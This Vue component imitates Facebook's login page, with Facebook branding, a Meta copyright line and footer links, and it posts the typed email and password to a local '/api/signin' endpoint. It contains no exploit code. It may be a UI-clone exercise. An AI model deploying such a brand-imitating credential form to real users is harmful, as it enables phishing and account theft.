<script setup lang="ts">
const email = ref('')
const password = ref('')

const handleSubmit = async () => {
  if (!email.value || !password.value) {
    return
  }

  // Call your API here
  try {
    await $fetch('/api/signin', {
      method: 'POST',
      body: JSON.stringify({ email: email.value, password: password.value }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
  } catch (error) {
    console.error(error)
  }
}
</script>
<template>
    <div class="max-md:hidden h-screen min-h-screen flex flex-col items-center bg-[#f0f2f5]">
    <div class="flex h-full items-center">
      <div class="h-fit flex flex-col md:flex-row justify-center w-full max-w-5xl mx-auto p-4">
        <!-- Left Side - Logo and Text -->
        <div class="text-center md:text-left w-full max-w-[500px] mr-8 mb-8 md:mb-0">
          <img class="-ml-[44px]" src="/assets/images/logo.svg" alt="" />
          <!-- <h1 class="text-5xl font-bold text-[#1877f2]">facebook</h1> -->
          <p class="text-[24px] text-gray-900 font-base">
            Facebook helps you connect and share <br />with the people in your life.
          </p>
        </div>

        <!-- Right Side - Login Form -->
        <div class="bg-white h-fit shadow-lg p-4 rounded-[8px] w-full max-w-[396px]">
          <form class="space-y-4" @submit.prevent="handleSubmit">
            <input
              v-model="email"
              type="text"
              placeholder="Email address or phone number"
              class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2]"
            />
            <input
              v-model="password"
              type="password"
              placeholder="Password"
              class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2]"
            />
            <button
              type="submit"
              class="w-full py-3 bg-[#1877f2] text-white rounded-md font-bold hover:bg-[#166fe5]"
            >
              Log in
            </button>
            <div class="text-center">
              <a href="#" class="text-[#1877f2] text-[14px] hover:underline">Forgotten password?</a>
            </div>
          </form>

          <hr class="my-6" />

          <div class="flex justify-center">
            <button
              class="w-fit px-4 py-3 bg-[#42b72a] text-white rounded-md font-bold hover:bg-[#36a420]"
            >
              Create new account
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Footer Section -->
    <footer class="bg-white w-full flex flex-col items-center py-4">
      <div class="max-w-[980px]">
        <!-- Language Links -->
        <div class="flex font-light justify-start space-x-4 text-gray-500 text-[12px]">
          <a href="#" class="hover:underline">English (UK)</a>
          <a href="#" class="hover:underline">Tiếng Việt</a>
          <a href="#" class="hover:underline">中文(台灣)</a>
          <a href="#" class="hover:underline">한국어</a>
          <a href="#" class="hover:underline">日本語</a>
          <a href="#" class="hover:underline">Français (France)</a>
          <a href="#" class="hover:underline">ภาษาไทย</a>
          <a href="#" class="hover:underline">Español</a>
          <a href="#" class="hover:underline">Português (Brasil)</a>
          <a href="#" class="hover:underline">Deutsch</a>
          <a href="#" class="hover:underline">Italiano</a>
          <button class="hover:underline flex items-center text-gray-500 text-xs">
            <span class="px-2">+</span>
          </button>
        </div>

        <!-- Divider Line -->
        <div class="max-w-[980px] w-full border-t border-gray-300 my-3"></div>

        <!-- Other Links -->
        <div
          class="max-w-[980px] font-light list-language flex flex-wrap justify-start text-gray-500 text-[12px]"
        >
          <a href="#" class="hover:underline">Sign Up</a>
          <a href="#" class="hover:underline">Log in</a>
          <a href="#" class="hover:underline">Messenger</a>
          <a href="#" class="hover:underline">Facebook Lite</a>
          <a href="#" class="hover:underline">Video</a>
          <a href="#" class="hover:underline">Places</a>
          <a href="#" class="hover:underline">Games</a>
          <a href="#" class="hover:underline">Marketplace</a>
          <a href="#" class="hover:underline">Meta Pay</a>
          <a href="#" class="hover:underline">Meta Store</a>
          <a href="#" class="hover:underline">Meta Quest</a>
          <a href="#" class="hover:underline">Ray-Ban Meta</a>
          <a href="#" class="hover:underline">Meta AI</a>
          <a href="#" class="hover:underline">Instagram</a>
          <a href="#" class="hover:underline">Threads</a>
          <a href="#" class="hover:underline">Fundraisers</a>
          <a href="#" class="hover:underline">Services</a>
          <a href="#" class="hover:underline">Voting Information Centre</a>
          <a href="#" class="hover:underline">Privacy Policy</a>
          <a href="#" class="hover:underline">Privacy Centre</a>
          <a href="#" class="hover:underline">Groups</a>
          <a href="#" class="hover:underline">About</a>
          <a href="#" class="hover:underline">AdChoices</a>
          <a href="#" class="hover:underline">Terms</a>
          <a href="#" class="hover:underline">Help</a>
          <a href="#" class="hover:underline">Contact uploading and non-users</a>
          <a href="#" class="hover:underline">Create ad</a>
          <a href="#" class="hover:underline">Create Page</a>
        </div>

        <!-- Copyright -->
        <div class="text-gray-500 font-light text-[12px] mt-3">Meta © 2024</div>
      </div>
    </footer>
  </div>
</template>
<style scoped>
/* Add any additional styling if necessary */
.list-language a {
  margin-right: 10px;
  margin-bottom: 8px;
  display: inline-block;
}
</style>